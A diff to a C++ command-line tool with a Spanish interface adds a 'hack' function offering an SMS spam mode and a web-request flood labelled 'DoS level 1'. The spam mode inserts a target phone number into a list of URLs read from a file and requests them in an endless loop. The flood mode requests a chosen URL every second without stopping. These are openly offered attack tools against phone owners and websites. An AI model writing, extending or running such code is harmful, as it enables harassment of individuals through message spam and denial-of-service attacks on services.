@@ -32,7 +32,7 @@
 using namespace std;
 
 struct key{
-    string version = "2";
+    string version = "3";
 }key;
 
 
@@ -96,8 +96,116 @@ string getl(string text, int line){
     return "";
 }
 
-int hack(int cc, char* arm[]){
+bool isnumber(string e){
+        int num  = 0;
+        while(true){
+            if(e.length() < num || e.length() == num){return true;}
+                if(e[num] == '0' || e[num] == '1' || e[num] == '2' || e[num] == '3' || e[num] == '4' || e[num] == '5' || e[num] == '6' || e[num] == '7' || e[num] == '8' || e[num] == '9'){
 
+                }else if(e[num] == ' '){
+
+                }else{
+                    return false;
+                }
+
+            num += 1;
+        }
+
+        return false;
+    }
+    int toNum(string e){
+        stringstream g(e);
+        int x = 0;
+        g >> x;
+        return x;
+    }
+
+struct pgweb{
+    string websms = R"(
+
+    )";
+}dat;
+
+
+int hack(int cc, char* arm[]){
+    string Fr3 = "\e[36m           _____    \n\e[36m          / ___ \\\n\e[36m         / /__/ | ____               \e[33mHerramientas\n\e[36m        / __  _/'/    \\+ +       [\e[33m-sms '%numero%' '%archivo%'\e[36m]:\e[37m spam sms\n\e[36m       / /  \\ \\ | |||. |+  +     [\e[33m-BResponse '%url%'\e[36m]:\e[37m consegir respuestas de una pagina web 'DoS' level 1\n\e[36m   + +/_/ + /_/+'\\____/' + +     [\e[33m-xerxer '%url%' '%puerto%'\e[36m]:\e[37m consegir respuestas de una pagina web 'DoS' level 1\n\e[36m    + +++  +   ++  +  + ++  + v1\n\e[36m   git hub: https://github.com/bite-rrjo\e[0m\n\n";
+    cout << F_Bold << Fr3;
+    cc -= 1;
+    string ff;
+    if(cc == 2){
+         ff = arm[1];
+        if(ff == "-BResponse"){
+            ff = arm[2];
+                while(true){
+                    sleep(1);
+                    string res = Internet.get(ff.c_str());
+                    if(Internet.infget() == 1){
+                        cout << F_Bold << Yellow << "  get! " << Blue << "true" << Yellow << ". " << ff << "\n";
+                    }else{
+                        cout << F_Bold << Yellow << "  get! " << Red << "false" << Yellow << ". " << ff << "\n";
+                    }
+                }
+        }else{
+            cout << Red << F_Bold << " no exite ninguna opcion '" << Yellow << ff << Red << ".\n" << F_Normal;
+            return 1;
+        }
+    }else if(cc == 3){
+        ff = arm[1];
+        if(ff == "-sms"){
+            ff = arm[3];
+            string c = arm[2];
+            if(isnumber(c) == true){
+                fstream file;
+                file.open(ff);
+                if(file.good() == true){
+                    string e;
+                    int num = 0;
+                    string ne;
+                    while(getline(file, e)){
+                        while(true){
+                            if(e.length() == num || e.length() < num){
+                                break;
+                            }
+                            if(e[num] == '%' && e[num+1] == 'p' && e[num+2] == 'h' && e[num+3] == 'o' && e[num+4] == 'n' && e[num+5] == 'e' && e[num+6] == '%' ){
+                                e.replace(num,6,c);
+                                break;
+                            }
+                            num += 1;
+                        }
+                        ne += e;
+                        ne += "\n";
+                    }
+                    file.close();
+                    stringstream fl(ne);
+                    while (true){
+                        sleep(1);
+                        while (getline(fl, e)){
+                            sleep(1);
+                            string res = Internet.get(e.c_str());
+                            if(Internet.infget() == 1){
+                                cout << F_Bold << Yellow << "  send! " << Blue << "true" << Yellow << ". " << ff << "\n";
+                            }else{
+                                cout << F_Bold << Yellow << "  send! " << Red << "false" << Yellow << ". " << ff << "\n";
+                            }
+                        }
+                    }
+                    return 0;
+
+                }else{
+                    cout << Red << F_Bold << " no exite ningun archivo llamado '" << Yellow << ff << Red << ".\n" << F_Normal;
+                    return 0;
+                }
+            }else{
+                cout << Red << F_Bold << " '" << Yellow << c << Red << "' no es un numero.\n" << F_Normal;
+                return 0;
+            }
+        }else{
+            cout << Red << F_Bold << " no exite ninguna opcion '" << Yellow << ff << Red << ".\n" << F_Normal;
+            return 1;
+        }
+    }
+
+    cout << F_Bold << Red << "\n error.\n" << F_Normal;
     return 0;
 }
 
